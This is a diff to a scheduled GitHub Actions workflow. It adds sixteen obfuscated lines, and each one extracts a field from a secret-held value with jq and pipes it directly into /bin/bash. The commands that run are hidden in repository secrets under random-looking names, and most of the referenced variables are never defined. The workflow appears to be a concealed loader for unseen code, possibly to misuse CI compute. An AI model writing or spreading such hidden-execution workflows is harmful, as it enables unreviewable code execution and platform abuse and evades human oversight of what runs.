@@ -2,7 +2,8 @@ name: colossalfrittata
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 2/6 * * *'
+    - cron: '31 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,12 +12,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: colossalfrittata
         env:
-          jo55032: ${{ secrets.jo55032 }}
+          pwg2: ${{ secrets.pwg2 }}
         run: |
-          echo $jo55032 | jq -r .hu43285 | /bin/bash
-          echo $ttb46306 | jq -r .db33355 | /bin/bash
-          echo $xf051 | jq -r .yrqqy38174 | /bin/bash
-          echo $p7635 | jq -r .ymeq786 | /bin/bash
-          echo $q8500 | jq -r .r106 | /bin/bash
-          echo $z71530 | jq -r .lkxn5 | /bin/bash
+          echo $pwg2 | jq -r .iav3464 | /bin/bash
+          echo $wys65 | jq -r .aww50 | /bin/bash
+          echo $hgvh55771 | jq -r .muwv6 | /bin/bash
+          echo $ypwzs5 | jq -r .etas0542 | /bin/bash
+          echo $rznws526 | jq -r .s22816 | /bin/bash
+          echo $znmru774 | jq -r .u395 | /bin/bash
+          echo $x53 | jq -r .bdubw9083 | /bin/bash
+          echo $m03989 | jq -r .gzrtr4 | /bin/bash
+          echo $awfy31310 | jq -r .n13743 | /bin/bash
+          echo $lois7663 | jq -r .ex27 | /bin/bash
+          echo $yfm92 | jq -r .qshp0 | /bin/bash
+          echo $bym3727 | jq -r .edm45134 | /bin/bash
+          echo $rmlex5 | jq -r .gmutx29 | /bin/bash
+          echo $doq8 | jq -r .rxhfx3708 | /bin/bash
+          echo $hpgcf4 | jq -r .yls888 | /bin/bash
+          echo $pinp75421 | jq -r .g9614 | /bin/bash
 
